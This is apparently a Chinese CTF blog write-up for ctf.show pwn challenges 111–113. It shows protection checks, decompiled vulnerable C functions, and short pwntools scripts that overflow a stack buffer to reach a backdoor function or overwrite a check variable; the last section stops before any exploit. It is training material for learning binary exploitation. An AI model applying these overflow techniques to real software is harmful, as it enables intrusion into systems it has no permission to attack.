<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Wi1lings">





<title>pwn入门（111~134） | Wi1lings</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 7.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Wi1lings&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Wi1lings&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">pwn入门（111~134）</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Wi1lings</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">March 4, 2025&nbsp;&nbsp;19:55:47</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="pwn-111"><a href="#pwn-111" class="headerlink" title="pwn 111"></a>pwn 111</h2><p>检查保护：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=MjQ4MmZhZDliYjBkNmYwYTc1OGYwZTAxZmRiM2VjMDhfT3M2a2hYbG1IMkJaZXZWa003aVhrNmdDWHFvRmZWdmtfVG9rZW46V0V4UWJpTEVRb1dyOFl4NXN4YmNNdncxbm1nXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>64位仅开启NX保护</p>
<p>IDA直接查看漏洞函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ODFkMTVjYWExZjNmNTI2YjE2OWJiMjM5NDExNDA4MzBfNDZuTGo2WWtpeWR2RU9XTVZQdEV4dWM0ZVJtMDl5Nk9fVG9rZW46Ulg5TWIxNmpxb0pkeTl4THV1UGNGcHZzbkdlXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>明显的栈溢出漏洞，观察到还有后门函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NmM3N2ZmMDcyNDAwMzE0MjJmNjlmZTMzOWIzOGQwYThfM1hUcEloY1BVM0RVVGpnRnBvZzFBbllxclI3NFQ1OGtfVG9rZW46Rk15ZmJSY3ppb1VPell4eDdMa2N4V1EybnRkXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>那么简单了，只需要栈溢出，将返回地址覆盖成这个函数的地址就可以拿到flag了。 </p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;) </span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28143</span>)</span><br><span class="line">flag = elf.sym[<span class="string">&#x27;_do_global&#x27;</span>]</span><br><span class="line"><span class="comment">#flag = 0x400697</span></span><br><span class="line">payload = cyclic(<span class="number">0x80</span>+<span class="number">8</span>) + p64(flag) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn-112"><a href="#pwn-112" class="headerlink" title="pwn 112"></a>pwn 112</h2><blockquote>
<p><mark>(要注意var变量这里提示了qword是4字节的，因此在输数据的时候应该用p32而不是直接用byte类型)</mark></p>
</blockquote>
<p>检查保护：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=Nzc0OWUyYWRlMjgxZWVmNTQzMWY4N2VlZjM5MmNlNWNfRWZCRTVMVlBGdkNGWW1jVWtXZEdyYm1iaUlSUzI3M2lfVG9rZW46VXI1MGJRYzNZb01hdVp4cjVVWGNaZDJWbmtnXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>32位保护全开，其中部分开启RELRO</p>
<p>IDA查看漏洞函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  var[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  var[<span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, var);</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] != <span class="number">0x11L</span>L )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">printf</span>(</span><br><span class="line">               <span class="string">&quot;something wrong! val is %d&quot;</span>,</span><br><span class="line">               var[<span class="number">0</span>],</span><br><span class="line">               var[<span class="number">1</span>],</span><br><span class="line">               var[<span class="number">2</span>],</span><br><span class="line">               var[<span class="number">3</span>],</span><br><span class="line">               var[<span class="number">4</span>],</span><br><span class="line">               var[<span class="number">5</span>],</span><br><span class="line">               var[<span class="number">6</span>],</span><br><span class="line">               var[<span class="number">7</span>],</span><br><span class="line">               var[<span class="number">8</span>],</span><br><span class="line">               var[<span class="number">9</span>],</span><br><span class="line">               var[<span class="number">10</span>],</span><br><span class="line">               var[<span class="number">11</span>],</span><br><span class="line">               var[<span class="number">12</span>],</span><br><span class="line">               var[<span class="number">13</span>],</span><br><span class="line">               var[<span class="number">14</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> register_tm();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s, Welcome!\n&quot;</span>, var);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Try doing something~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>细心观察其实就发现还是存在后门函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=YjNjMGIxMDkxMjc1NjlkMWUwYWJjNzM2NjRhZGM3MTFfcmJ0WWE2R3dUQ2NHd1Yybmp6U050YU5pbGRJV3VZTjVfVG9rZW46TlllcmJuaG5xb1FhN0F4ZlM0RmMyY25hbmNmXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDYxZDQ0MDBjOWY1YWJlNDRiNTYyNzIwZWY4OTQxNjNfZG9EWW9ua05iemZTVlBQQ1VvWndpTTVMN3R0azIyMEJfVG9rZW46VE11NGJkSFhQb3MwQzZ4MlhDRWMwclN1bkxlXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2UyMjMwMGExODFkNjkwM2JkOTdjZWJlYTA1OGI1MTJfMW1LY2tSRDJ1MFNGc09ZZHhCTE5JTHpvNVlWTkw0S2VfVG9rZW46UXZoamJCMzVWb04yWEd4S0x0U2NManNZbmxjXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>那么让var[13] &#x3D; 0x11 也就是十进制的17即可执行到后门函数了。</p>
<p>即直接将var[13]覆盖成17即可</p>
<p>Exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28232</span>)</span><br><span class="line">payload = p32(<span class="number">17</span>) * <span class="number">0xE</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn-113"><a href="#pwn-113" class="headerlink" title="pwn 113"></a>pwn 113</h2><p>检查保护：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=OWI0MjMyZmM5ZmMzMTMwZWQwMDBkMmFmYTRmMzZhMmVfaE9hcTlLQnBBN0NnNU5qMXJ6dnp4cmlBUXhZZFJNM2FfVG9rZW46QTM3VWJoMzZCbzV5czV4RWpsbmMxa3pNbmVnXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>64位程序完全开启RELRO保护，开启NX保护</p>
<p>IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">1032</span>]; <span class="comment">// [rsp+0h] [rbp-420h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+408h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+417h] [rbp-9h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+418h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  is_detail = <span class="number">0</span>;</span><br><span class="line">  go(argc, argv, envp);</span><br><span class="line">  logo();</span><br><span class="line">  fwrite(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="number">1uLL</span>, <span class="number">3uLL</span>, _bss_start);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !feof(<span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = v8++;</span><br><span class="line">    v6 = v3;</span><br><span class="line">    v5[v3] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  v5[v8] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)init(v5) )</span><br><span class="line">  &#123;</span><br><span class="line">    qsort(files, size_of_path, <span class="number">0x200u</span>LL, cmp);</span><br><span class="line">    search_file_info();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    fflush(_bss_start);</span><br><span class="line">    set_secommp();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进init():</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">init</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">v3</span>;</span> <span class="comment">// [rsp+10h] [rbp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> ptr[<span class="number">256</span>]; <span class="comment">// [rsp+A0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *src; <span class="comment">// [rsp+1A0h] [rbp-10h]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [rsp+1A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  size_of_path = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)stat(a1, &amp;v3) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">&quot;Can&#x27;t get the information of the given path.\n&quot;</span>);</span><br><span class="line">    fwrite(ptr, <span class="number">1uLL</span>, <span class="number">0x2Eu</span>LL, _bss_start);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (v3.st_mode &amp; <span class="number">0xF000</span>) == <span class="number">0x8000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    size_of_path = <span class="number">1</span>;</span><br><span class="line">    src = __xpg_basename(a1);</span><br><span class="line">    <span class="built_in">strcpy</span>(files, src);</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, a1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = v3.st_mode &amp; <span class="number">0xF000</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">0x4000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a1[<span class="built_in">strlen</span>(a1) - <span class="number">1</span>] != <span class="number">47</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v2 = &amp;a1[<span class="built_in">strlen</span>(a1)];</span><br><span class="line">        v6 = v2 + <span class="number">1</span>;</span><br><span class="line">        *v2 = <span class="number">47</span>;</span><br><span class="line">        *v6 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      get_dir_detail(a1);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逻辑看起来不明所以可能</p>
<p>注意到程序还开启了沙箱set_secommp()：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">set_secommp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 *v2; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+12h] [rbp-3Eh]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+13h] [rbp-3Dh]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  __int16 v7; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+1Ah] [rbp-36h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+1Bh] [rbp-35h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [rsp+22h] [rbp-2Eh]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [rsp+23h] [rbp-2Dh]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+24h] [rbp-2Ch]</span></span><br><span class="line">  __int16 v15; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [rsp+2Ah] [rbp-26h]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [rsp+2Bh] [rbp-25h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  __int16 v19; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [rsp+32h] [rbp-1Eh]</span></span><br><span class="line">  <span class="type">char</span> v21; <span class="comment">// [rsp+33h] [rbp-1Dh]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  __int16 v23; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> v24; <span class="comment">// [rsp+3Ah] [rbp-16h]</span></span><br><span class="line">  <span class="type">char</span> v25; <span class="comment">// [rsp+3Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// [rsp+3Ch] [rbp-14h]</span></span><br><span class="line">  __int16 v27; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> v28; <span class="comment">// [rsp+42h] [rbp-Eh]</span></span><br><span class="line">  <span class="type">char</span> v29; <span class="comment">// [rsp+43h] [rbp-Dh]</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// [rsp+44h] [rbp-Ch]</span></span><br><span class="line">  __int16 v31; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line">  <span class="type">char</span> v32; <span class="comment">// [rsp+4Ah] [rbp-6h]</span></span><br><span class="line">  <span class="type">char</span> v33; <span class="comment">// [rsp+4Bh] [rbp-5h]</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = <span class="number">32</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">4</span>;</span><br><span class="line">  v7 = <span class="number">21</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">5</span>;</span><br><span class="line">  v10 = <span class="number">-1073741762</span>;</span><br><span class="line">  v11 = <span class="number">32</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">53</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">1</span>;</span><br><span class="line">  v18 = <span class="number">0x40000000</span>;</span><br><span class="line">  v19 = <span class="number">21</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">2</span>;</span><br><span class="line">  v22 = <span class="number">-1</span>;</span><br><span class="line">  v23 = <span class="number">21</span>;</span><br><span class="line">  v24 = <span class="number">1</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">59</span>;</span><br><span class="line">  v27 = <span class="number">6</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">2147418112</span>;</span><br><span class="line">  v31 = <span class="number">6</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="number">8</span>;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  <span class="keyword">return</span> prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序的关键就是看各个函数以及了解一些结构体，如果对这些毫不了解，那么简单尝试运行程序：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2Y5NWVmNTFiMTQ1YjI0ZTdmMDhhNDc4MDFiODRlYWNfWGZFV2w5V2piTThTZzJRRmpCdjRReWFJY0wxUHFwRTNfVG9rZW46RkE3WGJqVHhTbzBVSFR4NGhvZmNuYmNYbjhlXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>随便输入，然后回显一个：Can’t get the information of the given path.（无法获取给定路径的信息。）</p>
<p>那么尝试给定一个路径试试 尝试根目录（&#x2F;）:</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWY0ZTdkNWI2MDUxMDJhNzk5MmM0ZmY3OTk4YTYzNDFfbXdiSGpEVVB0cE5kbmZERkp2VjVxSW9oeTA5RmZta2tfVG9rZW46R2luZ2JNalhtb0lzSzV4SjhQSmNNc2U2bjJDXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>发现能够看到给定路径下的文件</p>
